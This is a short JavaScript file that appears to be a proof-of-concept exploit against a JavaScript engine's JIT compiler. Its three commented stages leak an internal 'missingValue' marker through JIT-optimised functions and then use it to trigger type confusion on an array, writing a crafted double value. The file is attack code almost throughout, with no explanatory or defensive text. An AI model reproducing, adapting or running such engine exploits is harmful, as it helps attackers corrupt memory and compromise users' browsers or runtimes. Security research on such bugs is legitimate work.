
/*******************  stage1 ************/ 
// make a missingvalue var array

let arr = {};
arr[0] = 1.1;
arr[1] = 2.2;

let arr2 = [1.1,2.2,{}];

function jit(arg, index){
	
	let tmp = {"0":0x1234,"1":0x1234};   
	
	if(flag){
		arg = tmp;
	}
	arg[1] = 1.1;
	tmp[index] = 2;	
	arr2[0] = arg[0];	//give me a missingValue
}
flag = 1; jit(arr, 0);
flag = 0;
for(let i = 0;i < 0x10000;i++){
	jit(arr, 0);
}

flag = 1;
res = jit(arr, 0x14);

/*******************  stage2 ************/
//use evil var array make a missingvalue double array
let arr3 = [1.1,2.2,3.3];
let arr4 = [1.1,2.2,{}];

function jit2(arg, arr2){
	
	arg = arr2[0];  
	arr3[0] = arg;	
}

for(let i = 0;i < 0x10000;i++){
	jit2(2.2,arr4);
}

jit2(3.3, arr2);



// /*****************  type confusion stage3**************************/


let victim = [1.1,2.2,3.3];
function jit3(giveMeMissingValue, changeMe){
	let missingValue = giveMeMissingValue[0];
	victim[0] = 1.1;
	changeMe[0x100] = missingValue;
	victim[0] = 6.17651672645e-312;
}

for(let i = 0;i < 0x10000;i++){
	let farr = [1.1,2.2,3.3,4.4,5.5];
	delete farr[1];
	jit3(victim, farr);
}

jit3(arr3, victim);

print(victim[0]);